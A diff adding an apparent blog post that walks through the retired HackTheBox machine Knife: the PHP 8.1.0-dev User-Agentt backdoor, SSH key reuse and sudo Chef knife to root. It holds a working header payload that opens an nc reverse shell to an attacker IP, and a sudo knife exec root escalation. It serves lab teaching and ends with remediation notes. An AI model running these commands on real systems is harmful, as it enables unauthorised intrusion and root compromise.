@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Knife: the PHP 8.1 dev backdoor and a sudo knife to root — Lucky Thandel</title>
+<meta name="description" content="A User-Agentt header that is secretly a shell, a passphrase-protected key with the passphrase nearby, and Chef knife with sudo. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-22 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Knife: the PHP 8.1 dev backdoor and a sudo knife to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Knife is a retired HackTheBox easy Linux machine built on a real supply-chain scare. Synopsis: PHP 8.1.0-dev shipped with a backdoor where the User-Agentt header (note the double T) executes its value as PHP code.</p>
+<h2><span class="amber">$</span> Enumeration — read the Server banner</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: spot the backdoored build</span>
+nmap -sC -sV -oN knife.nmap 10.10.10.242
+curl -sI http://10.10.10.242/   # Server: PHP/8.1.0-dev</pre>
+<p>The Server header names the exact backdoored pre-release. When the banner names a backdoor, believe it — copy the misspelled header string precisely (double T).</p>
+<h2><span class="amber">$</span> Foothold — User-Agentt RCE</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: header payload to callback</span>
+curl -s -H &quot;User-Agentt: zerodiumsystem(\&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f\&quot;);&quot; http://10.10.10.242/
+nc -lvnp 4444   # james</pre>
+<p>One header, one shell — landing as the low-privilege james user.</p>
+<h2><span class="amber">$</span> Lateral move — encrypted key plus nearby passphrase</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: decrypt and step up</span>
+ls ~james/.ssh/   # encrypted private key
+# passphrase sits nearby in notes/configs/history -&gt; decrypt:
+ssh -i james_key james@10.10.10.242   # fuller interactive shell</pre>
+<p>Look around the filesystem for the passphrase before reaching for john — users leave passphrases in notes, configs, and history.</p>
+<h2><span class="amber">$</span> Privilege escalation — sudo knife</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: Ruby exec via Chef knife</span>
+sudo -l   # (root) NOPASSWD: /usr/bin/knife
+sudo /usr/bin/knife exec -E 'exec(&quot;/bin/sh&quot;)'
+id   # uid=0(root)</pre>
+<p>Chef knife exec runs Ruby, which execs anything — application CLIs with code-execution subcommands are root whenever sudo allows them. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Single-T header spelling (the backdoor checks the exact misspelling) and brute-forcing the key passphrase first.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Never run dev builds in production, keep keys encrypted with passphrases stored nowhere on disk, and audit sudo for exec-capable CLIs. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
